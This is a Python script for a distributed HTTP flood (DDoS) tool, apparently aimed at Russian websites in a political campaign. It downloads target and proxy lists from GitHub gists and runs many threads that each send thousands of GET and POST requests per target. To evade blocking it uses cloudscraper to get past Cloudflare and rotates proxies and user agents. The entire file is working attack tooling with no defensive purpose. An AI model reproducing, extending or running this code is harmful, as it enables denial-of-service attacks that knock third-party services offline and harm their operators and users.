# -*- coding: utf-8 -*-
from datetime import datetime, timedelta
from argparse import ArgumentParser
import json

import cloudscraper
import requests
import string
import os

from urllib.parse import unquote, urlparse
from copy import deepcopy
from gc import collect
from loguru import logger
import time
import sys
from sys import stderr
from threading import Thread, Lock
from random import choice
from random import randint
from random import random
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads
from queue import Queue

disable_warnings()
logger.remove()
#logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
logger.add(sys.stdout, colorize=True, format="<green>{time:HH:mm:ss}</green> <level>{message}</level>")
# logger.add(sys.stdout, colorize=True, format="<green>{time}</green> {extra[proxy]} {extra[target]} {extra[err_code]} {extra[err_count]} <level>{message}</level>")
# logger.add(sys.stdout, serialize=True)


ALLOVED_PAREQ_CHARS = string.ascii_letters + string.digits
ALLOVED_MD_CHARS = string.digits

MAX_REQUESTS = 1000

SITES = None
PROXIES = None


def base_scraper():
    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox',
                                                   'platform': 'android',
                                                   'mobile': True},)
    scraper.headers.update({
            'Content-Type': 'application/json',
            'cf-visitor': 'https',
            'User-Agent': random_useragent(),
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru',
            'x-forwarded-proto': 'https',
            'Accept-Encoding': 'gzip, deflate, br'})

    return scraper


def mainth(protocol, cur_proxy, proxy_name, region, queue_counters, sites):
    # Fetching data with proxy and targets

    counter403 = {}

    counter_total = 0

    while True:
        counter_total += 1
        if counter_total > 10000:
            counter_total = 0
            sites = get_sites()
            proxies = get_proxies()
            (protocol, cur_proxy, proxy_name, region) = choice(proxies)
            logger.info("NEW PROXY SELECTED")
        scraper = base_scraper()
        # logger.info("GET RESOURCES FOR ATTACK")
        # data = choice(sites)
        if len(sites) <= 0:
            logger.info("MOSKALI SOSUT! ATTACK WILL BE RESTARTED IN FEW MINUTES")
            sleep(300)
            counter_total = 100500
            continue

        index_ = randint(0, len(sites) - 1)
        current_target = sites[index_]['url']
        current_request_type = sites[index_]['request_type']
        if not current_target.startswith(protocol):
            sites.pop(index_)
            continue

        if region != 'all' and current_target.find(region) < 0:
            sites.pop(index_)
            continue

        scraper.proxies.update({'http': cur_proxy,
                                'https': cur_proxy})

        # logger.info("STARTING ATTACK TO " + current_target)
        for _ in range(MAX_REQUESTS):
            try:
                if current_request_type == 'post':
                    response = scraper.post(current_target, data=sites[index_]['body'], headers=sites[index_]['headers'])
                else:
                    response = scraper.get(current_target)
                queue_counters.put({'proxy': proxy_name, 'target': current_target, 'status': response.status_code, 'value': 1})

                if response.status_code == 404 or ((current_target in counter403) and (counter403[current_target] >= 30)):
                    sites.pop(index_)
                    break
                if response.status_code == 403 or (500 <= int(response.status_code) < 600):
                    if current_target not in counter403:
                        counter403[current_target] = 0
                    counter403[current_target] += 1
                else:
                    if current_target in counter403 and counter403[current_target] > 0:
                        counter403[current_target] -= 1

            except BaseException as err:
                # logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
                queue_counters.put({'proxy': proxy_name, 'target': current_target, 'status': 'e', 'value': 1})
                try:
                    sites.pop(index_)
                except BaseException:
                    ...
                finally:
                    break


def cleaner():
    while True:
        sleep(60)
        collect()


def get_sites():
    logger.info('Getting targets...')
    sites_ = []
    try:
        # with open('list.txt') as f:
        #     sites_get = f.read().splitlines()
        sites_get = loads(requests.get("https://gist.github.com/Mekhanik/3d90e637a86401bf726b489d2adeb958/raw/tg?a=" + str(random())).content)
        sites_post = loads(requests.get("https://gist.githubusercontent.com/Mekhanik/a378f10370dbca0ed587c2467eafb8f8/raw?a=" + str(random())).content)
        for url in sites_get:
            sites_.append({'url': url, 'request_type': 'get'})
        for obj in sites_post:
            obj['request_type'] = 'post'
            sites_.append(obj)
        SITES = deepcopy(sites_)
    except BaseException:
        if SITES:
            sites_ = deepcopy(SITES)
        else:
            exit(1)
    # logger.info(json.dumps(sites, indent=4))
    return sites_


def get_proxies():
    # proxies_ = [
    #     ['https://', 'http://34.65.156.141:4598', 'test', 'all']
    # ]
    logger.info('Getting proxies...')
    proxies_ = None
    try:
        proxies_ = loads(requests.get("https://gist.githubusercontent.com/Mekhanik/6d36aa2f722b3fd957ca5521ce0242b2/raw/px?a=" + str(random())).content)
        PROXIES = deepcopy(proxies_)
    except BaseException:
        if PROXIES:
            proxies_ = deepcopy(PROXIES)
        else:
            exit(2)
    return proxies_


# def pbar(window):
#     str_num = 1
#     for targets, proxy in counter_by_sites:
#         str_num += 1
#         window.addstr(y=str_num, str=proxy)
#     window.refresh()
#     time.sleep(3)


def stat_visualiser(queue_counters):
    counter_by_sites = {}
    reset_time = datetime.now() + timedelta(minutes=60)
    while True:
        while queue_counters.qsize() > 0:
            rec = queue_counters.get(block=True)
            if rec['proxy'] not in counter_by_sites:
                counter_by_sites[rec['proxy']] = {}
            if rec['target'] not in counter_by_sites[rec['proxy']]:
                counter_by_sites[rec['proxy']][rec['target']] = {}
            if rec['status'] not in counter_by_sites[rec['proxy']][rec['target']]:
                counter_by_sites[rec['proxy']][rec['target']][rec['status']] = 0
            counter_by_sites[rec['proxy']][rec['target']][rec['status']] += rec['value']
            queue_counters.task_done()
        # logger.info(json.dumps(counter_by_sites, indent=4))
        str_ = ''
        for proxy, targets in counter_by_sites.items():
            str_ += "\n" + proxy + "\n"
            for target, codes in targets.items():
                parsed = urlparse(target)
                str_ += parsed.scheme + '://' + parsed.netloc
                for code, count in codes.items():
                    str_ += f" {code}:{count}"
                str_ += " | "
        logger.info(str_)
        time.sleep(5)
        if datetime.now() > reset_time:
            counter_by_sites = {}
            reset_time = datetime.now() + timedelta(minutes=60)
        os.system('clear')


if __name__ == '__main__':
    queue_counters = Queue()
    proxies = get_proxies()
    sites = get_sites()

    parser = ArgumentParser()
    parser.add_argument("-w", "--workers", type=int, help="number of simultaneously running workers")
    args = parser.parse_args()
    if args.workers:
        threads = int(args.workers)
    else:
        threads = int(input('Кількість потоків: '))

    for _ in range(threads):
        args_ = choice(proxies)
        Thread(target=mainth, args=args_ + [queue_counters, sites]).start()

    Thread(target=cleaner, daemon=True).start()
    Thread(target=stat_visualiser, args=(queue_counters, )).start()
